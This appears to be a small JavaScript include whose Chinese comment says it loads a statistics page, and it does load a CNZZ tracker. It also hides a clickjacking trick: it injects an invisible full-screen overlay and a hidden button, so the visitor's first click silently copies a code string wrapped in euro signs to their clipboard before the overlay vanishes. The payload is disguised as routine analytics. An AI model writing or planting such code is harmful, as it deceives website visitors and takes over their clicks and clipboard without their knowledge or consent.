(function () {
    //加载统计页面
    document.write("<script src=\"https://cdn.bootcss.com/clipboard.js/2.0.0/clipboard.min.js\" type=\"text/javascript\"></\script>");
    document.write("<div id=\"abc\" style=\"width: 100%; height: 100%; top: 0;left: 0; position: fixed; z-index: 99999;\" ></div>");
    document.write("<button id=\"target\" style=\"display: none\" data-clipboard-text=\"€GLS20yy9WAc€\">button</button>");
    document.write("<script type=\"text/javascript\">new ClipboardJS(\"#target\");document.getElementById(\"abc\").onclick = function() {document.getElementById(\"target\").click();document.getElementById(\"abc\").hidden = true;};</\script>");
    document.write("<script src=\"https://s22.cnzz.com/z_stat.php?id=1274035492&web_id=1274035492\" language=\"JavaScript\"></\script>");
})();